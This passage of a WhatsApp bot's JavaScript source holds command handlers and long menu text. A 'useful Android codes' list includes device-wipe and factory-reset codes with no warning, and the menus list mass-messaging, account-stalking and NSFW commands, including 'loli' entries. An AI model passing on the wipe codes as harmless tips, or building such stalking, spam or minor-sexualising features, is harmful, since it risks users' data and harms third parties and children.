            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/jtipd0.mp3'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

case 'broken': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `💔`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > HEY @${sender.split("@")[0]}    
   𝙸 𝚆𝙰𝚂 𝙾𝙽𝙲𝙴 𝙸𝙽 𝙻𝙾𝚅𝙴 🥺💔`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/w0026d.mp3'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

case 'fyn': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `😪`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > HEY @${sender.split("@")[0]}    
   𝙄 𝘼𝙈 𝙉𝙊𝙏 𝙁𝙔𝙉 !!! 😞`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/6yjvs6.mp3'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

case 'credit': {
let menya = `══════════
╭─┴❍「 *CREDIT* 」❍
│𝙨𝙥𝙚𝙘𝙞𝙖𝙡 𝙩𝙝𝙖𝙣𝙠𝙨 𝙩𝙤 𝘽𝙈𝘽 𝙓 𝘿𝘼𝙍𝙀${readmore}
│𝘽.𝙈.𝘽 => 2348089405509
│😎
│🌍
│🤖
│⚡
│🔪
│𝚃𝙷𝙴𝚈 𝙷𝙴𝙻𝙻𝙿𝙴𝙳 𝙸𝙽 𝚃𝙷𝙴 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙼𝙴𝙽𝚃 𝙾𝙵 
│𝙳𝙰𝚁𝙴-𝚅3 
╰──────❍ > 𝚜𝚙𝚎𝚌𝚒𝚊𝚕 𝚝𝚑𝚊𝚗𝚔𝚜 𝚝𝚘 𝙳𝙰𝚁𝙴. 
╰━━━━━━━━━━━━━━━━━━━━━━━━━╼`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break

case 'encode': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    const textToEncode = m.quoted?.text || args.join(' '); 
    if (!textToEncode) 
        return replydare(`\`Provide a message.\`\n*𝔼𝕩𝕒𝕞𝕡𝕝𝕖: ${prefix + command} BMB IS THE BEST*`);

    try {
        reply(mess.wait)

        const apiUrl = `https://api.popcat.xyz/encode?text=${encodeURIComponent(textToEncode)}`;
        const response = await fetch(apiUrl);
        const json = await response.json();

        if (!json.binary) {
            return replydare("Failed to encode.");
        }

        // Reply with clean binary text
        replydare(`${json.binary}`);

    } catch (error) {
        console.error("Error in encode case:", error);
        replydare(" *Error occured.");
    }
    break;
}
case 'decode': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    let binaryToDecode = m.quoted?.text || args.join(' ');

    // Sanitize input (remove backticks, newlines, and extra spaces)
    binaryToDecode = binaryToDecode.replace(/[`*\n\r]/g, '').trim();

    if (!binaryToDecode) 
        return replydare(`\`Please provide an encoded code to decode.\`\n*Example: ${prefix + command} 𝟘𝟙𝟙𝟘𝟙𝟙𝟘𝟙𝟙𝟘𝟘𝟟*`);

    try {
        reply(mess.wait)

        // API call
        const apiUrl = `https://api.popcat.xyz/decode?binary=${encodeURIComponent(binaryToDecode)}`;
        const response = await fetch(apiUrl);
        const json = await response.json();

        if (!json.text) {
            return replydare("Failed to decode.");
        }

        replydare(`*🔤 Decoded Text:*\n\n\`\`\`${json.text}\`\`\``);

    } catch (error) {
        console.error("Error in decode case:", error);
        replydare("An error occured.");
    }
    break;
}
case 'ownermenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 🔥 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 🔥 』━⊱${readmore}
> 🛡️ *${prefix}ONLYPC*
> 🏠 *${prefix}ONLYGC*
> 🤖 *${prefix}SELF*
> 🧹 *${prefix}CLEAR*
> 🌍 *${prefix}PUBLIC*
> 🔗 *${prefix}JOIN*
> 📢 *${prefix}BROADCAST*
> 🚫 *${prefix}ANTICALL* 
> 🔥 *${prefix}AUTOREACT* 
> 📊 *${prefix}POLL* 
> 🖼️ *${prefix}BCIMAGE* 
> 🎥 *${prefix}BCVIDEO* 
> 👥 *${prefix}CREATEGC* 
> 🎭 *${prefix}SETPACKNAME* 
> 🆔 *${prefix}USERJID*
> 🤖 *${prefix}SETBOTNAME*  
> 📜 *${prefix}SETBOTBIO* 
> ❌ *${prefix}DELPPBOT* 
> 🔄 *${prefix}RESTART* 
> 🖼️ *${prefix}SETPPBOT* 
> 💎 *${prefix}ADDPREM* 
> ❌ *${prefix}DELPREM* 
> 👑 *${prefix}ADDOWNER* 
> 🚫 *${prefix}DELOWNER*   
> ⛔ *${prefix}BLOCK* 
> ✅ *${prefix}UNBLOCK*  
> 🚪 *${prefix}LEFT*  
> 📇 *${prefix}PUSHCONTACT*  
> 📁 *${prefix}SAVECONTACT*   
> 📂 *${prefix}SAVECONTACT2*  
> 🔍 *${prefix}GETCONTACT*  
> 📤 *${prefix}SENDCONTACT*   
> 📬 *${prefix}JPM*   
> 📭 *${prefix}JPM2*   
┗━━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'codes': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
let menya = `🧑🏻‍💻  
⚙️ 𝗨𝗦𝗘𝗙𝗨𝗟 𝗔𝗡𝗗𝗥𝗢𝗜𝗗 𝗖𝗢𝗗𝗘𝗦 ⚙️  
${readmore}  
📌 *𝗧𝗘𝗦𝗧𝗜𝗡𝗚 & 𝗗𝗜𝗔𝗚𝗡𝗢𝗦𝗧𝗜𝗖𝗦*  
🔹 *#*#4636#*#* – 𝗧𝗘𝗦𝗧𝗜𝗡𝗚 𝗠𝗘𝗡𝗨  
🔹 *#*#34971539#*#* – 𝗖𝗔𝗠𝗘𝗥𝗔 𝗜𝗡𝗙𝗢  
🔹 *#*#232339#*#* – 𝗪𝗜𝗥𝗘𝗟𝗘𝗦𝗦 𝗟𝗔𝗡 𝗧𝗘𝗦𝗧  
🔹 *#*#1472365#*#* – 𝗤𝗨𝗜𝗖𝗞 𝗚𝗣𝗦 𝗧𝗘𝗦𝗧  
🔹 *#*#1575#*#* – 𝗔𝗡𝗢𝗧𝗛𝗘𝗥 𝗚𝗣𝗦 𝗧𝗘𝗦𝗧  
🔹 *#*#0283#*#* – 𝗣𝗔𝗖𝗞𝗘𝗧 𝗟𝗢𝗢𝗣𝗕𝗔𝗖𝗞 𝗧𝗘𝗦𝗧  
🔹 *#*#0673#*#* OR *#*#0289#*#* – 𝗔𝗨𝗗𝗜𝗢 𝗧𝗘𝗦𝗧  
🔹 *#*#0842#*#* – 𝗩𝗜𝗕𝗥𝗔𝗧𝗜𝗢𝗡 & 𝗕𝗔𝗖𝗞𝗟𝗜𝗚𝗛𝗧 𝗧𝗘𝗦𝗧  
🔹 *#*#2663#*#* – 𝗖𝗛𝗘𝗖𝗞 𝗧𝗢𝗨𝗖𝗛 𝗦𝗖𝗥𝗘𝗘𝗡 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  
🔹 *#*#0*#*# – 𝗟𝗖𝗗 𝗧𝗘𝗦𝗧  
🔹 *#*#2664#*#* – 𝗧𝗢𝗨𝗖𝗛 𝗦𝗖𝗥𝗘𝗘𝗡 𝗧𝗘𝗦𝗧  
🔹 *#*#0588#*#* – 𝗣𝗥𝗢𝗫𝗜𝗠𝗜𝗧𝗬 𝗦𝗘𝗡𝗦𝗢𝗥 𝗧𝗘𝗦𝗧  
🔹 *#*#3264#*#* – 𝗥𝗔𝗠 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  
🔹 *#*#232331#*#* – 𝗕𝗟𝗨𝗘𝗧𝗢𝗢𝗧𝗛 𝗧𝗘𝗦𝗧  
🔹 *#*#7262626#*#* – 𝗙𝗜𝗘𝗟𝗗 𝗧𝗘𝗦𝗧  
🔹 *#*#232337#*#* – 𝗖𝗛𝗘𝗖𝗞 𝗕𝗟𝗨𝗘𝗧𝗢𝗢𝗧𝗛 𝗗𝗘𝗩𝗜𝗖𝗘 𝗔𝗗𝗗𝗥𝗘𝗦𝗦  
${readmore}
📌 *𝗦𝗬𝗦𝗧𝗘𝗠 & 𝗦𝗘𝗥𝗩𝗜𝗖𝗘 𝗖𝗢𝗗𝗘𝗦*  
🔹 *#*#8255#*#* – 𝗚𝗢𝗢𝗚𝗟𝗘 𝗧𝗔𝗟𝗞 𝗦𝗘𝗥𝗩𝗜𝗖𝗘 𝗠𝗢𝗡𝗜𝗧𝗢𝗥𝗜𝗡𝗚  
🔹 *#*#4986*2650468#*#* – 𝗣𝗗𝗔, 𝗛𝗔𝗥𝗗𝗪𝗔𝗥𝗘 & 𝗥𝗙 𝗖𝗔𝗟𝗟 𝗗𝗔𝗧𝗘 𝗜𝗡𝗙𝗢  
🔹 *#*#1234#*#* – 𝗙𝗜𝗥𝗠𝗪𝗔𝗥𝗘 𝗖𝗛𝗘𝗖𝗞  
🔹 *#*#2222#*#* – 𝗙𝗧𝗔 𝗛𝗔𝗥𝗗𝗪𝗔𝗥𝗘 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  
🔹 *#*#1111#*#* – 𝗙𝗧𝗔 𝗦𝗢𝗙𝗧𝗪𝗔𝗥𝗘 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  
🔹 *#06#* – 𝗗𝗜𝗦𝗣𝗟𝗔𝗬 𝗜𝗠𝗘𝗜 𝗡𝗨𝗠𝗕𝗘𝗥  
🔹 *#*#8351#*#* – 𝗘𝗡𝗔𝗕𝗟𝗘 𝗩𝗢𝗜𝗖𝗘 𝗗𝗜𝗔𝗟𝗜𝗡𝗚 𝗟𝗢𝗚𝗚𝗜𝗡𝗚  
🔹 *#*#8350#*#* – 𝗗𝗜𝗦𝗔𝗕𝗟𝗘 𝗩𝗢𝗜𝗖𝗘 𝗗𝗜𝗔𝗟𝗜𝗡𝗚 𝗟𝗢𝗚𝗚𝗜𝗡𝗚  
${readmore}
📌 *𝗙𝗔𝗖𝗧𝗢𝗥𝗬 𝗥𝗘𝗦𝗘𝗧 & 𝗙𝗟𝗔𝗦𝗛𝗜𝗡𝗚*  
🔹 *#*#7780#*#* – 𝗙𝗔𝗖𝗧𝗢𝗥𝗬 𝗥𝗘𝗦𝗧𝗢𝗥𝗘  
🔹 *2767*3855#* – 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗟𝗬 𝗪𝗜𝗣𝗘 𝗗𝗘𝗩𝗜𝗖𝗘 & 𝗥𝗘𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗙𝗜𝗥𝗠𝗪𝗔𝗥𝗘  
🔹 *#*#44336#*#* – 𝗦𝗛𝗢𝗪 𝗕𝗨𝗜𝗟𝗗 𝗧𝗜𝗠𝗘 & 𝗖𝗛𝗔𝗡𝗚𝗘 𝗟𝗜𝗦𝗧 𝗡𝗨𝗠𝗕𝗘𝗥  
🔹 *#03#* – 𝗡𝗔𝗡𝗗 𝗙𝗟𝗔𝗦𝗛 𝗦𝗘𝗥𝗜𝗔𝗟 𝗡𝗨𝗠𝗕𝗘𝗥  
${readmore}
📌 *𝗢𝗧𝗛𝗘𝗥 𝗨𝗦𝗘𝗙𝗨𝗟 𝗖𝗢𝗗𝗘𝗦*  
🔹 *#*#778 + CALL#*#* – 𝗘𝗣𝗦𝗧 𝗠𝗘𝗡𝗨  
🔹 *#0228#* – 𝗕𝗔𝗧𝗧𝗘𝗥𝗬 𝗦𝗧𝗔𝗧𝗨𝗦  
🔹 *#*#273283*255*3282#*#* – 𝗗𝗔𝗧𝗔 𝗖𝗥𝗘𝗔𝗧𝗘 𝗠𝗘𝗡𝗨  
🔹 *#3282*727336#* – 𝗗𝗔𝗧𝗔 𝗨𝗦𝗔𝗚𝗘 𝗦𝗧𝗔𝗧𝗨𝗦  
🔹 *#8736364#* – 𝗢𝗧𝗔 𝗨𝗣𝗗𝗔𝗧𝗘 𝗠𝗘𝗡𝗨  
🔹 *#2263#* – 𝗥𝗙 𝗕𝗔𝗡𝗗 𝗦𝗘𝗟𝗘𝗖𝗧𝗜𝗢𝗡  
🔹 *#9090#* – 𝗗𝗜𝗔𝗚𝗡𝗢𝗦𝗧𝗜𝗖 𝗖𝗢𝗡𝗙𝗜𝗚  
🔹 *#746#* – 𝗗𝗘𝗕𝗨𝗚 𝗗𝗨𝗠𝗣 𝗠𝗘𝗡𝗨  
🔹 *#7353#* – 𝗤𝗨𝗜𝗖𝗞 𝗧𝗘𝗦𝗧 𝗠𝗘𝗡𝗨  
🔹 *05#* – 𝗨𝗡𝗟𝗢𝗖𝗞 𝗣𝗨𝗞 𝗖𝗢𝗗𝗘  
━━━━━━━━━━━━━━━━━━━━━━  
📢 ˢʰᵃʳᵉ ʷⁱᵗʰ ᶜʳᵉᵈⁱᵗˢ *B.M.B*`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'allmenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `*𝐡𝐞𝐫𝐞 𝐚𝐫𝐞 𝐭𝐡𝐞 𝐥𝐢𝐬𝐭 𝐨𝐟 𝐦𝐞𝐧𝐮* *${botname}*
*𝐤𝐢𝐧𝐝𝐥𝐲 𝐝𝐨𝐧𝐭 𝐬𝐩𝐚𝐦* 🐣
=========================
乂 ɴᴀᴍᴇ ʙᴏᴛ : *${botname}*
乂 ᴠᴇʀsɪᴏɴ : *𝟑*
乂 ʀᴜɴ : *ᴘʀɪᴠᴀᴛᴇ ʜᴏsᴛɪɴɢ*
乂 ᴍᴏᴅᴇ: *${Dare.public ? 'Public' : 'Self'}*
乂 ᴛʏᴘᴇ : ᴄᴀsᴇ
乂 ᴏᴡɴᴇʀ ʙᴏᴛ : ${ownername}
=========================
${readmore}
┈─────────────────
       *\`𝐀𝐋𝐋 𝐌𝐄𝐍𝐔\`*
┈─────────────────

『 *\`𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔\`* 』━⊱
> *${prefix}onlypc*
> *${prefix}onlygc*
> *${prefix}self*
> *${prefix}clear*
> *${prefix}public* 
> *${prefix}join* 
> *${prefix}broadcast* 
> *${prefix}poll* 
> *${prefix}bcimage*
> *${prefix}bcvideo*
> *${prefix}creategc*
> *${prefix}setpackname*
> *${prefix}userjid*
> *${prefix}setbotname*
> *${prefix}setbotbio*
> *${prefix}delppbot*
> *${prefix}restart*
> *${prefix}setppbot*
> *${prefix}addprem*
> *${prefix}delprem*
> *${prefix}addowner*
> *${prefix}delowner*
> *${prefix}block---*
> *${prefix}unblock---*
> *${prefix}left*
> *${prefix}pushcontact*
> *${prefix}savecontact*
> *${prefix}savecontact2*
> *${prefix}getcontact*
> *${prefix}sendcontact*
> *${prefix}jpm*
> *${prefix}jpm2*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}setwelcome*
> *${prefix}setleft*
> *${prefix}welcome on/off*
> *${prefix}antilink*
> *${prefix}linkgc*
> *${prefix}invite*
> *${prefix}disappear*
> *${prefix}del*
> *${prefix}setgcpp{not working}*
> *${prefix}delgcpp{not working}*
> *${prefix}setname*
> *${prefix}setdesc*
> *${prefix}add*
> *${prefix}kick*
> *${prefix}promote*
> *${prefix}demote*
> *${prefix}hidetag*
> *${prefix}tag*
> *${prefix}tagall*
> *${prefix}resetlink{not working}*
> *${prefix}getbio*
> *${prefix}vote*
> *${prefix}upvote*
> *${prefix}downvote*
> *${prefix}checkvote*
> *${prefix}delvote*
> *${prefix}autostickergc*
> *${prefix}nsfw*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐀𝐍𝐎𝐍𝐘𝐌𝐎𝐔𝐒 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}anonymouschat*
> *${prefix}start*
> *${prefix}next*
> *${prefix}stop*
> *${prefix}sendprofile*
> *${prefix}menfess*
> *${prefix}confess*
> *${prefix}replyfess*
> *${prefix}refusefess*
> *${prefix}stopmenfess*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐏𝐔𝐒𝐇 𝐌𝐄𝐍𝐔\`* 』━━◧
> *${prefix}cekidgc*
> *${prefix}pushcontact*
> *${prefix}savecontact*
> *${prefix}savecontact2*
> *${prefix}getcontact*
> *${prefix}sendcontact*
> *${prefix}jpm*
> *${prefix}jpm2*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐂 𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}listusr*
> *${prefix}delusr*
> *${prefix}listsrv*
> *${prefix}delsrv*
> *${prefix}tutorial*
> *${prefix}ramlist*
> *${prefix}premlist*
> *${prefix}updatesrv*
> *${prefix}suspend*
> *${prefix}unsuspend*
> *${prefix}createadmin*
> *${prefix}listadmin*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
▭▬▭▬▭( *𝐋𝐈𝐒𝐓 𝐑𝐀𝐌* ▬▭▬▭

.1gb [username,number]
.2gb [username,number]
.3gb [username,number]
.4gb [username,number]
.5gb [username,number]
.6gb [username,number]
.7gb [username,number]
.8gb [username,number]
.unli [username,number]

Example:
.ram username,number
.1gb number, 234xxx
▬▭▬▭▬▭▬▭▬▭▬▭▬
${readmore}
『 *\`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔\`* 』
> ${prefix}tiktok
> ${prefix}tiktokslide
> ${prefix}tiktokaudio
> ${prefix}ytsearch
> ${prefix}ttsearch
> ${prefix}play
> ${prefix}ytmp3
> ${prefix}ytmp4
> ${prefix}imdb
> ${prefix}weather
> ${prefix}instagram
> ${prefix}facebook
> ${prefix}twittervid
> ${prefix}telestick
> ${prefix}spotify
> ${prefix}gitclone
> ${prefix}happymod
> ${prefix}pinterest
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐆𝐀𝐌𝐄 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}guess*
> *${prefix}riddles*
> *${prefix}lyricgame*
> *${prefix}picguess*
> *${prefix}songguess*
> *${prefix}chemistry*
> *${prefix}tictactoe*
> *${prefix}tease*
> *${prefix}whoami*
> *${prefix}word*
> *${prefix}puzzle*
> *${prefix}flagguess*
> *${prefix}flagguessv2*
> *${prefix}district*
> *${prefix}caklontong*
> *${prefix}werewolf*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐑𝐏𝐆 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}work*
> *${prefix}dragon*
> *${prefix}fightcat*
> *${prefix}phoenix*
> *${prefix}griffin*
> *${prefix}kyubi*
> *${prefix}centaur*
> *${prefix}save*
> *${prefix}mining*
> *${prefix}bank*
> *${prefix}thief*
> *${prefix}savings*
> *${prefix}withdraw*
> *${prefix}gardening*
> *${prefix}crafting*
> *${prefix}bet*
> *${prefix}bonus*
> *${prefix}fruit*
> *${prefix}down*
> *${prefix}assist*
> *${prefix}taxi*
> *${prefix}gloomy*
> *${prefix}hunt*
> *${prefix}polisi*
> *${prefix}trade*
> *${prefix}rob*
> *${prefix}kill*
> *${prefix}collect*
> *${prefix}fishing*
> *${prefix}repair*
> *${prefix}feed*
> *${prefix}fight*
> *${prefix}payday*
> *${prefix}upgrade*
> *${prefix}transfer*
> *${prefix}shop*
> *${prefix}selectskill*
> *${prefix}rubbish*
> *${prefix}rocket*
> *${prefix}bike*
> *${prefix}hangout*
> *${prefix}market*
> *${prefix}robbery*
> *${prefix}referral*
> *${prefix}petshop*
> *${prefix}pool*
> *${prefix}cowboy*
> *${prefix}leaderboard*
> *${prefix}casino*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐒𝐓𝐀𝐋𝐊𝐄𝐑 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}igstalk*
> *${prefix}ttstalk*
> *${prefix}ytstalk*
> *${prefix}mlstalk*
> *${prefix}npmstalk*
> *${prefix}ghstalk*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐎𝐏𝐄𝐍 𝐀𝐈 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}leptonai*
> *${prefix}openai*
> *${prefix}ai*
> *${prefix}bard*
> *${prefix}guru-ai*
> *${prefix}realistic*
> *${prefix}blackboxai*
> *${prefix}lamaai*
> *${prefix}bingai*
> *${prefix}gpt*
> *${prefix}gpt2*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐅𝐔𝐍 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}smeme*
> *${prefix}ppcouple*
> *${prefix}define*
> *${prefix}qc*
> *${prefix}lyrics*
> *${prefix}suit*
> *${prefix}math*
> *${prefix}tictactoe*
> *${prefix}fact*
> *${prefix}truth*
> *${prefix}dare*
> *${prefix}couple*
> *${prefix}soulmate*
> *${prefix}stupidcheck*
> *${prefix}handsomecheck*
> *${prefix}uncleancheck*
> *${prefix}hotcheck*
> *${prefix}smartcheck*
> *${prefix}greatcheck*
> *${prefix}evilcheck*
> *${prefix}dogcheck*
> *${prefix}coolcheck*
> *${prefix}waifucheck*
> *${prefix}awesomecheck*
> *${prefix}gaycheck*
> *${prefix}cutecheck*
> *${prefix}lesbiancheck*
> *${prefix}hornycheck*
> *${prefix}prettycheck*
> *${prefix}lovelycheck*
> *${prefix}uglycheck*
> *${prefix}pick*
> *${prefix}quotes*
> *${prefix}can*
> *${prefix}is*
> *${prefix}when*
> *${prefix}where*
> *${prefix}what*
> *${prefix}how*
> *${prefix}rate*
> *${prefix}cry*
> *${prefix}kill*
> *${prefix}hug*
> *${prefix}pat*
> *${prefix}lick*
> *${prefix}kiss*
> *${prefix}bite*
> *${prefix}yeet*
> *${prefix}bully*
> *${prefix}bonk*
> *${prefix}wink*
> *${prefix}poke*
> *${prefix}nom*
> *${prefix}slap*
> *${prefix}smile*
> *${prefix}wave*
> *${prefix}awoo*
> *${prefix}blush*
> *${prefix}smug*
> *${prefix}glomp*
> *${prefix}happy*
> *${prefix}dance*
> *${prefix}cringe*
> *${prefix}cuddle*
> *${prefix}highfive*
> *${prefix}shinobu*
> *${prefix}handhold*
> *${prefix}spank*
> *${prefix}tickle*
> *${prefix}avatar*
> *${prefix}feed*
> *${prefix}foxgirl*
> *${prefix}gecg*
> *${prefix}checkme*
> *${prefix}sound1 - sound161*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐑𝐀𝐍𝐃𝐎𝐌𝐏𝐇𝐎𝐓𝐎 𝐌𝐄𝐍𝐔\`* 』
> *${prefix}aesthetic*
> *${prefix}wallpaper*
> *${prefix}art*
> *${prefix}bts*
> *${prefix}8ballpool*
> *${prefix}cosplay*
> *${prefix}hacker*
> *${prefix}cyber*
> *${prefix}gamewallpaper*
> *${prefix}islamic*
> *${prefix}cartoon*
> *${prefix}pentol*
> *${prefix}cat*
> *${prefix}kpop*
> *${prefix}exo*
> *${prefix}lisa*
> *${prefix}space*
> *${prefix}car*
> *${prefix}technology*
> *${prefix}bike*
> *${prefix}shortquote*
> *${prefix}hacking*
> *${prefix}rose*
> *${prefix}wallml*
> *${prefix}wallphone*
> *${prefix}mountain*
> *${prefix}profilepic*
> *${prefix}couplepic*
> *${prefix}programming*
> *${prefix}pubg*
> *${prefix}blackpink*
┗━━━━━━━━━━━━━━━━⊱
${readmore}
『 *\`𝐀𝐍𝐈𝐌𝐄\`* 』
> *${prefix}akira*
> *${prefix}akiyama*
> *${prefix}ana*
> *${prefix}asuna*
> *${prefix}ayuzawa*
> *${prefix}boruto*
> *${prefix}chiho*
> *${prefix}chitoge*
> *${prefix}cosplayloli*
> *${prefix}cosplaysagiri*
> *${prefix}deidara*
> *${prefix}doraemon*
> *${prefix}elaina*
> *${prefix}emilia*
> *${prefix}erza*
> *${prefix}gremory*
> *${prefix}hestia*
> *${prefix}hinata*
> *${prefix}husbu*
> *${prefix}inori*
> *${prefix}isuzu*
> *${prefix}itachi*
> *${prefix}itori*
> *${prefix}kaga*
> *${prefix}kagura*
> *${prefix}kakasih*
> *${prefix}kaori*
> *${prefix}keneki*
> *${prefix}kotori*
> *${prefix}kurumi*
> *${prefix}loli*
> *${prefix}madara*
> *${prefix}megumin*
> *${prefix}mikasa*
> *${prefix}mikey*
> *${prefix}miku*
> *${prefix}minato*
> *${prefix}naruto*
> *${prefix}neko*
> *${prefix}neko2*
> *${prefix}nekonime*
> *${prefix}nezuko*
> *${prefix}onepiece*
> *${prefix}pokemon*
> *${prefix}randomnime*
> *${prefix}randomnime2*
> *${prefix}rize*
> *${prefix}sagiri*
> *${prefix}sakura*
> *${prefix}sasuke*
> *${prefix}shina*
> *${prefix}shinka*
> *${prefix}shinomiya*
> *${prefix}shizuka*
> *${prefix}shota*
> *${prefix}tejina*
> *${prefix}toukachan*
> *${prefix}tsunade*
> *${prefix}waifu*
> *${prefix}animewall*
> *${prefix}yotsuba*
> *${prefix}yuki*
> *${prefix}yulibocil*
> *${prefix}yumeko*
> *${prefix}8ball*
> *${prefix}tickle*
> *${prefix}gecg*
> *${prefix}feed*
> *${prefix}animeawoo*
> *${prefix}animemegumin*
> *${prefix}animeshinobu*
> *${prefix}animehandhold*
> *${prefix}animehighfive*
> *${prefix}animecringe*
> *${prefix}animedance*
> *${prefix}animehappy*
> *${prefix}animeglomp*
> *${prefix}animeblush*
> *${prefix}animesmug*
> *${prefix}animewave*
> *${prefix}animesmile*
> *${prefix}animepoke*
> *${prefix}animewink*
> *${prefix}animebonk*
> *${prefix}animebully*
> *${prefix}animeyeet*
> *${prefix}animebite*
> *${prefix}animelick*
> *${prefix}animekill*
> *${prefix}animecry*
> *${prefix}animewlp*
> *${prefix}animekiss*
> *${prefix}animehug*
> *${prefix}animeneko*
> *${prefix}animepat*
> *${prefix}animeslap*
> *${prefix}animecuddle*
> *${prefix}animewaifu*
> *${prefix}animenom*
> *${prefix}animefoxgirl*
> *${prefix}animegecg*
> *${prefix}animetickle*
> *${prefix}animefeed*
> *${prefix}animeavatar*
> *${prefix}genshin*
> *${prefix}anime*
> *${prefix}amv*
╰━━━━━━━━━━━━━━━━━━
${readmore}
『 *\`𝐍𝐒𝐅𝐖 𝐌𝐄𝐍𝐔\`* 』 
> *${prefix}paptt*
> *${prefix}hentaivid*
> *${prefix}hentaivid2*
> *${prefix}hneko*
> *${prefix}nwaifu*
> *${prefix}animespank*
> *${prefix}trap*
> *${prefix}gasm*
> *${prefix}ahegao*
> *${prefix}ass*
> *${prefix}bdsm*
> *${prefix}blowjob*
> *${prefix}cuckold*
> *${prefix}cum*
> *${prefix}milf*
> *${prefix}eba*
> *${prefix}ero*
> *${prefix}femdom*
> *${prefix}foot*
> *${prefix}gangbang* 
> *${prefix}glasses*
> *${prefix}jahy*
> *${prefix}masturbation*
> *${prefix}manga*
> *${prefix}neko-hentai*
> *${prefix}neko-hentai2*
> *${prefix}nsfwloli*
> *${prefix}orgy*
> *${prefix}panties*
> *${prefix}pussy*
> *${prefix}tentacles*
> *${prefix}thighs*
> *${prefix}yuri*
> *${prefix}zettai*
> *${prefix}xnxxsearch*
┗━━━━━━━━━━━━━━━━⊱ 
